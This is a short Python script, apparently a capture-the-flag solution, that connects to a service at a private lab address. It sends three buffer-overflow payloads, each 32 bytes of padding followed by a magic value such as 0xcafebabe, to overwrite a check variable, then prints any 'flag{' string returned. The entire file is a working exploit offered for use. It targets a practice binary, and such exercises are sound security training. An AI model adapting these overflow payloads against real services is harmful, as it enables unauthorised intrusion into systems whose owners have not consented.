#!env python3

import socket, pdb

host="192.168.137.131"
port=12346
tups = [
    ("1\n", b"a"*32+b"\xef\xbe\x75\xfa\n"),
    ("2\n", b"b"*32+b"\xbe\xba\xfe\xca\n"),
    ("3\n", b"c"*32+b"\x78\x56\x34\x12\n")
]

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host,port))
    data = sock.recv(72)
    for opt,msg in tups:
        print("Choosing: {}".format(opt[0]))
        sock.send(opt.encode())
        data = sock.recv(1024)
        print("Message: {}".format(msg))
        sock.send(msg)
        data = sock.recv(1024)
        data = data[0:len(data)-2]
        data = data.decode()
        if "flag{" in data:
            data = data.split("\n")[1]
            print(data)
